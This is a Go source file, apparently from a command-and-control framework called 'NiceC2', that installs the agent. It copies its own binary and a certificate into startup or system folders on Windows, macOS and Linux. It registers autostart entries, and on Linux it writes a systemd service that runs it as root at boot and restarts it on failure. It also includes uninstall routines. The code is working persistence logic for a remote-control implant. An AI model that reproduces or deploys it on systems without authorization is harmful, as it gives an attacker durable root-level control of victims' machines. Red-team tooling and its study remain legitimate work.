package main

import (
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"

	"github.com/emersion/go-autostart"
)

func start_installer() {
	err, destination_path := installSelf()
	if err != nil {
		fmt.Println(err)
		// return
	}

	log.Println("File created at: " + destination_path)

	switch runtime.GOOS {
	case "linux":
		fmt.Println("Linux detected. Creating service...")

		// Does things different in Linux, so that the code can run as root
		err := create_auto_start_Linux(destination_path)
		if err != nil {
			fmt.Sprintln(err)
		}

	case "darwin":
		fmt.Println("MacOS detected. Creating Auto-Start for MacOS...")

		create_auto_start("sh", destination_path)
	case "windows":
		fmt.Println("Windows detected. Creating auto-start for Windows!....")

		create_auto_start("ps", destination_path)
	default:
		fmt.Println("Error detecting OS")
		return

	}

}

func installSelf() (error, string) {
	// Get the name of the current executable.
	self, err := os.Executable()
	if err != nil {
		return fmt.Errorf("could not get executable path: %v", err), ""
	}

	// Determine the default location for background applications based on the operating system.
	var dst string
	switch runtime.GOOS {
	case "linux":
		dst = "/usr/local/bin/NiceC2_agent/"
	case "darwin":
		// dst = "/Library/Application Support/NiceC2/"

		currentUser, err := user.Current()
		if err != nil {
			panic(err)
		}
		dst = "/Users/" + currentUser.Username + "/Library/NiceC2_agent/"

	case "windows":
		dst = filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "NiceC2")
	default:
		return fmt.Errorf("unsupported operating system: %s", runtime.GOOS), ""
	}

	// Check if the directory already exists
	if _, err := os.Stat(dst); os.IsNotExist(err) {
		// Create the directory with 0755 permissions (rwxr-xr-x)
		err = os.Mkdir(dst, 0755)
		if err != nil {
			fmt.Printf("Error creating directory %s: %s\n", dst, err)
			return err, ""
		}

		fmt.Printf("Directory %s created successfully\n", dst)
	} else if err != nil {
		// Handle other errors that occurred while checking if the directory exists
		fmt.Printf("Error checking for directory %s: %s\n", dst, err)
		return err, ""
	} else {
		// Directory already exists, do nothing
		fmt.Printf("Directory %s already exists\n", dst)
	}

	// Open the destination file for writing.
	dstFile, err := os.Create(filepath.Join(dst, filepath.Base(self)))
	if err != nil {
		return fmt.Errorf("could not create destination file: %v", err), ""
	}
	defer dstFile.Close()

	// Open the source file for reading.
	srcFile, err := os.Open(self)
	if err != nil {
		return fmt.Errorf("could not open source file: %v", err), ""
	}
	defer srcFile.Close()

	// Copy the contents of the source file to the destination file.
	_, err = io.Copy(dstFile, srcFile)
	if err != nil {
		fmt.Println("Error copying file")
		return fmt.Errorf("could not copy file: %v", err), ""
	}

	// Set the executable bit on Linux and macOS.
	if runtime.GOOS == "linux" || runtime.GOOS == "darwin" {
		err = os.Chmod(filepath.Join(dst, filepath.Base(self)), 0755)
		if err != nil {
			return fmt.Errorf("could not set executable bit: %v", err), ""
		}
	}

	// Copy the server.crt file to the same directory as the executable.

	fmt.Println("copying cert file")
	crtFile := "server.crt"
	crtSrc, err := os.Open(crtFile)
	if err != nil {
		return fmt.Errorf("could not open %s file: %v", crtFile, err), ""
	}
	defer crtSrc.Close()

	crtDst, err := os.Create(filepath.Join(dst, crtFile))
	if err != nil {
		return fmt.Errorf("could not create %s file: %v", crtFile, err), ""
	}
	defer crtDst.Close()

	_, err = io.Copy(crtDst, crtSrc)
	if err != nil {
		return fmt.Errorf("could not copy File to Destination"), ""
	}

	return nil, filepath.Join(dst, filepath.Base(self))

}

func check_enabled(shell string, commandString string) bool {
	app := &autostart.App{
		Name:        "NiceC2",
		DisplayName: "NiceC2 command agent",
		Exec:        []string{shell, "-c", commandString},
	}

	if app.IsEnabled() {
		return true
	} else {
		return false
	}
}

func create_auto_start(shell string, commandString string) {
	app := &autostart.App{
		Name:        "NiceC2",
		DisplayName: "NiceC2 command agent",
		Exec:        []string{shell, "-c", commandString},
	}

	if app.IsEnabled() {
		log.Println("App is already enabled")

		// if err := app.Disable(); err != nil {
		// 	log.Fatal(err)
		// }
	} else {
		log.Println("Enabling app...")

		if err := app.Enable(); err != nil {
			log.Fatal(err)
		}
	}

}

func remove_auto_start(shell string, commandString string) {
	app := &autostart.App{
		Name:        "NiceC2",
		DisplayName: "NiceC2 command agent",
		Exec:        []string{shell, "-c", commandString},
	}

	if app.IsEnabled() {
		log.Println("Removing app")

		if err := app.Disable(); err != nil {
			log.Fatal(err)
		}
	} else {
		fmt.Println("App is not endabled")
	}
}

func create_auto_start_Linux(installPath string) error {

	// Set the path to the systemd service file
	serviceFilePath := "/etc/systemd/system/NiceC2.service"

	// Create the systemd service file
	serviceFile, err := os.Create(serviceFilePath)
	if err != nil {
		fmt.Println("Error creating service file:", err)
		return err
	}
	defer serviceFile.Close()

	// Write the service file content
	_, err = serviceFile.WriteString(`[Unit]
Description=NiceC2 agent
After=network.target

[Service]
ExecStart=` + installPath + `
WorkingDirectory=/usr/local/bin/NiceC2_agent/
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target`)

	if err != nil {
		fmt.Println("Error writing service file:", err)
		return err
	}

	// Reload the systemd configuration
	reloadCmd := exec.Command("systemctl", "daemon-reload")
	err = reloadCmd.Run()
	if err != nil {
		fmt.Println("Error reloading systemd configuration:", err)
		return err
	}

	// Enable the service to auto-start at boot
	enableCmd := exec.Command("systemctl", "enable", "NiceC2.service")
	err = enableCmd.Run()
	if err != nil {
		fmt.Println("Error enabling service to auto-start at boot:", err)
		return err
	}

	fmt.Println("Service created and registered to auto-start at boot as root.")

	return nil
}

func remove_auto_start_linux() error {
	// Disable the service from auto-starting at boot
	disableCmd := exec.Command("systemctl", "disable", "NiceC2.service")
	if err := disableCmd.Run(); err != nil {
		return fmt.Errorf("error disabling service from auto-starting at boot: %v", err)
	}

	// Stop the service if it is running
	stopCmd := exec.Command("systemctl", "stop", "NiceC2.service")
	if err := stopCmd.Run(); err != nil {
		return fmt.Errorf("error stopping service: %v", err)
	}

	// Remove the systemd service file
	serviceFilePath := "/etc/systemd/system/NiceC2.service"
	if err := os.Remove(serviceFilePath); err != nil {
		return fmt.Errorf("error removing service file: %v", err)
	}

	fmt.Println("Service removed and disabled from auto-starting at boot.")
	return nil
}
